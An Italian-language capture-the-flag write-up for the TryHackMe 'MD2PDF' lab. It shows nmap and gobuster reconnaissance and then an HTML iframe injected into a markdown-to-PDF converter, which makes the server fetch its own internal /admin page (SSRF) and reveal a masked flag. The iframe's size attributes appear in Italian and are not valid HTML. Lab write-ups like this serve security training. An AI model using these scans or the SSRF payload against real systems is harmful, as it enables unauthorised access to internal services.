
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/md2pdf


```
nmap -Pn -vv -O 10.10.147.42
```

```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 62
5000/tcp open  upnp    syn-ack ttl 62

```

```
nmap -sVC -v -p22,80,5000 10.10.147.42
```

```
ORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 79:a8:4c:63:72:93:3f:15:42:5f:6f:19:e7:b4:c1:e0 (RSA)
|   256 7f:9c:9d:20:5b:57:72:a6:07:33:69:98:2b:f0:0c:a8 (ECDSA)
|_  256 4c:b9:eb:f2:6f:c3:0e:f2:6c:17:95:fc:a2:c4:a8:50 (ED25519)
80/tcp   open  rtsp
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-title: MD2PDF
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2660
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <meta
|     name="viewport"
|     content="width=device-width, initial-scale=1, shrink-to-fit=no"
|     <link
|     rel="stylesheet"
|     href="./static/codemirror.min.css"/>
|     <link
|     rel="stylesheet"
|     href="./static/bootstrap.min.css"/>
|     <title>MD2PDF</title>
|     </head>
|     <body>
|     <!-- Navigation -->
|     <nav class="navbar navbar-expand-md navbar-dark bg-dark">
|     <div class="container">
|     class="navbar-brand" href="/"><span class="">MD2PDF</span></a>
|     </div>
|     </nav>
|     <!-- Page Content -->
|     <div class="container">
|     <div class="">
|     <div class="card mt-4">
|     <textarea class="form-control" name="md" id="md"></textarea>
|     </div>
|     <div class="mt-3
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|_    Content-Length: 0
5000/tcp open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2624
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <meta
|     name="viewport"
|     content="width=device-width, initial-scale=1, shrink-to-fit=no"
|     <link
|     rel="stylesheet"
|     href="./static/codemirror.min.css"/>
|     <link
|     rel="stylesheet"
|     href="./static/bootstrap.min.css"/>
|     <title>MD2PDF</title>
|     </head>
|     <body>
|     <!-- Navigation -->
|     <nav class="navbar navbar-expand-md navbar-dark bg-dark">
|     <div class="container">
|     class="navbar-brand" href="/"><span class="">MD2PDF</span></a>
|     </div>
|     </nav>
|     <!-- Page Content -->
|     <div class="container">
|     <div class="">
|     <div class="card mt-4">
|     <textarea class="form-control" name="md" id="md"></textarea>
|     </div>
|     <div class="mt-3
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|_    Content-Length: 0
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :

```

http://10.10.147.42
in questo indirizzo abbiamo un form dove scrivere il testo che sarà convertito in pdf

http://10.10.147.42:5000/
simil cosa anche qui

potrebbero essere possibili attacchi XSS o SSRF

facciamo un pò di enumerazione 
```
gobuster dir -u http://10.10.147.42 -w /usr/share/wordlists/dirb/common.txt -t50
```
```
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 403) [Size: 166]
Progress: 4614 / 4615 (99.98%)

```
```
gobuster dir -u http://10.10.147.42:5000 -w /usr/share/wordlists/dirb/common.txt -t50
```
troviamo una dir /admin (sia su porta 80 che 5000)

http://10.10.147.42/admin

visitando la pagina abbiamo come risposta
```
# Forbidden

This page can only be seen internally (localhost:5000)
```

creiamo quindi un iframe che convertito in pdf ci darà accesso alla dir /admin inquanto eseguito in localhost tramite il server

```
http://10.10.147.42
```
```
<iframe src = "http://localhost:5000/admin" altezza = "1000" larghezza = "1000" >  
</iframe >
```
che ci restituisce la flag!
```
flag{xxxxxxxxxxxxxxxxx}
```